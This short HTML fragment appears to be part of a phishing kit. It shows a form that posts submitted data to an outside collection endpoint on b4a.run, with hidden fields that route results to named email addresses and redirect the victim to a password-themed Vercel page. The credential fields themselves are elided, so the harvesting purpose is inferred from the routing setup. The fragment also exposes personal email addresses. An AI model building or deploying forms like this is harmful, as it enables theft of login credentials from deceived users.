<html lang="en">
    ...
    <body>
        <form class=content action=https://apisubmit-8ll0irls.b4a.run/post method=POST>
                ...
                <input hidden="true" name="name" value="Umais">
                <input hidden="true" name="workerEmail" value="marieprzibylla.agent@gmail.com">
                <input hidden="true" name="email" value="saadnizamani555@gmail.com">
                <input hidden="true" name="redirectUrl" value="https://password-b.vercel.app/">
